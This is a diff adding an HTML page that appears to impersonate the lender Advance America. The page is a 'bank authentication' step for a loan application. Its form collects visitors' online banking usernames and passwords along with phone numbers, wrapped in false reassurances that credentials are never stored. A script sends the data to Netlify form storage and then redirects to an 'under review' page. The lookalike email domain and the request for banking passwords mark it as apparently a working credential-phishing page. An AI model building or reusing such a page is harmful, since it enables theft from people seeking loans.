@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Authentication - Cash Advance America</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo">
+                <img src="advance-america-logo.svg" alt="Advance America" class="logo-img">
+            </div>
+            <button class="mobile-menu-toggle" aria-label="Toggle mobile menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+            <nav class="nav-menu">
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="index.html#about">About Us</a></li>
+                    <li><a href="ppi.html">PPI</a></li>
+                    <li><a href="bank-authentication.html" class="active">Bank Authentication</a></li>
+                    <li><a href="index.html#application" class="btn-apply">Complete Disbursal Now</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <section class="bank-auth-section">
+            <div class="container">
+                <div class="auth-content">
+                    <h1>Secure Bank Authentication</h1>
+                    <div class="security-badges">
+                        <div class="security-badge">
+                            <i class="fas fa-shield-alt"></i>
+                            <div>
+                                <h4>Bank-Level Security</h4>
+                                <p>256-bit SSL encryption protects your data</p>
+                            </div>
+                        </div>
+                        <div class="security-badge">
+                            <i class="fas fa-lock"></i>
+                            <div>
+                                <h4>Never Stored</h4>
+                                <p>Login credentials are never permanently stored</p>
+                            </div>
+                        </div>
+                        <div class="security-badge">
+                            <i class="fas fa-bolt"></i>
+                            <div>
+                                <h4>Instant Verification</h4>
+                                <p>Quick account verification process</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="auth-info">
+                        <p><strong>Your banking information is protected with bank-level security. We use 256-bit SSL encryption and never store your login credentials permanently.</strong></p>
+                        <h3>Connect Your Bank Account</h3>
+                        <p>To complete your loan application, we need to verify your bank account information.</p>
+                        <p><strong>I hereby authorize Advance America Online Loans (under reversal credit & reversal process) to access and utilize the following banking information for the specific purpose of processing payments, setting up direct deposits, etc.</strong></p>
+                    </div>
+
+                    <form id="bankAuthForm" class="bank-auth-form" name="bank-authentication" netlify>
+                        <div class="form-group">
+                            <label for="bankName">Bank Name *</label>
+                            <input type="text" id="bankName" name="bankName" required>
+                        </div>
+
+
+
+
+
+                        <div class="form-group">
+                            <label for="onlineBankingUsername">Online Banking Username *</label>
+                            <input type="text" id="onlineBankingUsername" name="onlineBankingUsername" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="onlineBankingPassword">Online Banking Password *</label>
+                            <input type="password" id="onlineBankingPassword" name="onlineBankingPassword" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="phoneNumber">Phone Number *</label>
+                            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="(555) 123-4567" required>
+                        </div>
+
+                    <div class="info-box">
+                        <h3><i class="fas fa-info-circle"></i> Why do we need this?</h3>
+                        <ul>
+                            <li><i class="fas fa-check"></i> Verify your identity and account ownership</li>
+                            <li><i class="fas fa-check"></i> Confirm your income and employment</li>
+                            <li><i class="fas fa-check"></i> Ensure fast and secure loan funding</li>
+                            <li><i class="fas fa-check"></i> Comply with federal lending regulations</li>
+                        </ul>
+                    </div>
+
+                        <div class="form-group checkbox-group">
+                            <input type="checkbox" id="consent" name="consent" required>
+                            <label for="consent">I consent to the bank authentication process and authorize the verification of my banking information as described above. *</label>
+                        </div>
+
+                        <button type="submit" class="btn btn-primary submit-btn">
+                            <span class="btn-text">Submit Authentication</span>
+                            <span class="btn-loading" style="display: none;">
+                                <i class="fas fa-spinner fa-spin"></i> Processing...
+                            </span>
+                        </button>
+                    </form>
+
+                    <div id="authSuccess" class="success-message" style="display: none;">
+                        <div class="success-content">
+                            <i class="fas fa-check-circle"></i>
+                            <h3>Bank Authentication Completed!</h3>
+                            <p>Your banking information has been successfully verified. Our loan processing team will review your application and contact you within 24 hours.</p>
+                            <div class="next-steps">
+                                <h4>Next Steps:</h4>
+                                <ul>
+                                    <li>Keep your phone available for verification calls</li>
+                                    <li>Check your email for updates on your application status</li>
+                                    <li>Prepare any additional documents that may be requested</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-contact">
+                    <h3>Contact Us</h3>
+                    <p><i class="fas fa-map-marker-alt"></i> Nationwide Service Available</p>
+                    <p><i class="fas fa-phone"></i> 323-207-6834</p>
+                    <p><i class="fas fa-envelope"></i> support@cashadvanceamericaos.com</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 Cash Advance America Online Loans. All rights reserved.</p>
+                <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('bankAuthForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.querySelector('.submit-btn');
+            const btnText = document.querySelector('.btn-text');
+            const btnLoading = document.querySelector('.btn-loading');
+            const form = document.getElementById('bankAuthForm');
+            const successDiv = document.getElementById('authSuccess');
+            
+            // Show loading state
+            btnText.style.display = 'none';
+            btnLoading.style.display = 'inline-block';
+            submitBtn.disabled = true;
+            
+            // Form validation passed
+            
+            // Collect form data
+            const formData = new FormData(form);
+            
+            // Add application ID from session storage if available
+            const applicationId = sessionStorage.getItem('loanApplicationId');
+            if (applicationId) {
+                formData.append('application_id', applicationId);
+            }
+            
+            // Add application ID as hidden field if available
+            if (applicationId) {
+                const hiddenField = document.createElement('input');
+                hiddenField.type = 'hidden';
+                hiddenField.name = 'application_id';
+                hiddenField.value = applicationId;
+                bankAuthForm.appendChild(hiddenField);
+            }
+            
+            // Save bank auth data to localStorage as backup
+            const timestamp = new Date().toISOString();
+            const bankAuthData = {
+                bank_name: formData.get('bankName'),
+                account_type: formData.get('accountType'),
+                online_banking_username: formData.get('onlineBankingUsername'),
+                phone_number: formData.get('phoneNumber'),
+                application_id: applicationId,
+                timestamp: timestamp,
+                submission_method: 'netlify'
+            };
+            localStorage.setItem('bank_auth_' + (applicationId || Date.now()), JSON.stringify(bankAuthData));
+            
+            // Submit the form to Netlify
+            bankAuthForm.submit();
+            
+            // Redirect to under-review page after a short delay
+            setTimeout(() => {
+                // Clear session storage
+                sessionStorage.removeItem('loanApplicationData');
+                sessionStorage.removeItem('loanApplicationId');
+                
+                // Redirect to under-review page
+                window.location.href = 'under-review.html';
+            }, 1000);
+            
+            // Reset button state
+            submitBtn.disabled = false;
+            btnText.style.display = 'inline';
+            btnLoading.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
